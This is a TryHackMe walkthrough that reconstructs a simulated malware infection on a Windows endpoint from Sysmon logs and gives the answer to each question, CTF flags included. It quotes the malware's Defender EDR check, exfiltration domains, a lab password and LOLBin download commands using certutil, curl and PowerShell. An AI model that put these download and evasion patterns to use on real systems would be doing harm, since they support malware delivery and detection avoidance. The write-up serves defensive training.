# TryHackMe – Windows Threat Detection 2

This room focused on investigating Windows endpoints using Sysmon logs, Windows Event Viewer, and built-in Windows utilities. The tasks covered privilege discovery, malware execution, credential theft, data exfiltration, and understanding how attackers abuse legitimate Windows tools (LOLBins).

---

# A. Investigation

## 1. Which privileged group does the user belong to?

### How I solved it

I opened Command Prompt and checked the Administrator account details.

```cmd
net user administrator
```

The output listed the local groups the account belonged to.

**Answer:** `Administrators`

---

## 2. What is the Image field of the `net` command?

### How I solved it

I opened **Event Viewer** and navigated to:

```
Applications and Services Logs
    └── Microsoft
          └── Windows
                └── Sysmon
                      └── Operational
```

I filtered for **Event ID 1 (Process Create)** and searched for the execution of `net.exe`.

The **Image** field contained the executable path.

**Answer:**

```
C:\Windows\System32\net.exe
```

---

## 3. What is the first command executed by `invoice.pdf.exe`?

### How I solved it

I looked at the Sysmon logs immediately after the malware execution and filtered **Event ID 1 (Process Create)**. The first child process executed by the malware was easy to identify.

**Answer:**

```
whoami
```

---

## 4. Which command checks for Microsoft Defender EDR?

### How I solved it

Continuing through the process creation events, I reviewed the command line arguments executed by the malware.

**Answer:**

```cmd
cmd /c "tasklist /v | findstr MsSense.exe || echo No MS Defender EDR"
```

This checks whether **MsSense.exe**, the Microsoft Defender for Endpoint process, is running.

---

## 5. Which domain received the discovered information?

### How I solved it

I inspected the network-related events generated after the reconnaissance commands and located the destination domain used for exfiltration.

**Answer:**

```
exfil.beecz.cafe
```

---

## 6. What is the Facebook password saved in Chrome?

### How I solved it

Instead of searching logs, I opened Chrome and navigated to:

```
Chrome
→ Password Manager
```

The saved Facebook credential was stored there.

**Answer:**

```
nsAghv51BBav90!
```

---

## 7. Which SSH key is stored on the system?

### How I solved it

I checked the default SSH folder for the current user.

```
C:\Users\Administrator\.ssh
```

There I found the stored SSH private key.

**Answer:**

```
thm-access-database.key
```

---

## 8. Which secret PDF explains TryHackMe's internal network?

### How I solved it

I searched the user's Downloads folder for recently downloaded documents.

**Answer:**

```
thm-network-diagram-2025.pdf
```

---

## 9. Which directory does the malware create?

### How I solved it

Returning to the Sysmon timeline, I reviewed the commands executed immediately after the malware started. The malware created a staging directory before collecting data.

**Answer:**

```
staging_58f1
```

---

## 10. Which domain is used for data exfiltration?

### How I solved it

I filtered **Sysmon Event ID 22 (DNS Query)** and looked for external domains contacted after data collection.

**Answer:**

```
collecteddata-storage-2025.s3.amazonaws.com
```

---

## 11. What flag is returned when visiting the URL using Chrome?

### How I solved it

I simply opened the provided URL in Chrome and observed the server response.

**Answer:**

```
THM{just_use_web_browser}
```

---

## 12. What flag is returned when downloading with `curl.exe`?

### How I solved it

I downloaded the file using `curl`.

```cmd
curl.exe <URL> -o good.exe
```

The response returned a different flag.

**Answer:**

```
THM{curl_is_cool}
```

---

## 13. What flag is returned when using `certutil.exe`?

### How I solved it

I downloaded the same file using the Windows LOLBin `certutil`.

```cmd
certutil.exe -urlcache -f <URL>
```

**Answer:**

```
THM{abusing_certutil}
```

---

## 14. What flag is returned when using PowerShell?

### How I solved it

Finally, I used PowerShell's `Invoke-WebRequest` to download the same file.

```powershell
powershell -c "Invoke-WebRequest -Uri '<URL>' -OutFile 'good.exe'"
```

**Answer:**

```
THM{power_of_powershell}
```

---

# What I Learned

This room helped me understand how attackers abuse legitimate Windows tools and how Sysmon can be used to reconstruct an attack timeline.
